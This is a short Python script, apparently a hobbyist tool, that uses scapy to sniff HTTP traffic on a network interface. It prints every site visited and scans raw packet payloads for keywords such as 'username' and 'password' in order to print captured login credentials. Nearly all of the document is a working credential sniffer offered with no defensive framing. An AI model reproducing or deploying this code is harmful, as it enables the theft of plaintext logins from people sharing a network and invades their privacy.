from numpy import logical_not
from scapy.all import sniff, Raw
from scapy.layers import http


def sniffing(interface):
    sniff(iface=interface, store= False, prn=process_sniffed_packet)

def getURL(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
    

def getLogin(packet):
    keywords = ["username", "password", "user", "pass", "login"]
    if packet.haslayer(Raw):
            loadvar = packet[Raw].load
            for i in keywords:
                if i in loadvar: #scan for keywords in packet
                    return("Possible username or pass: \n\n" + loadvar)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getURL(packet)
        print("Site visited: \n\n" + url)
        loginf = getLogin(packet)
        print(loginf)
        
        

if __name__=="__main__":
    sniffing("eth0")
    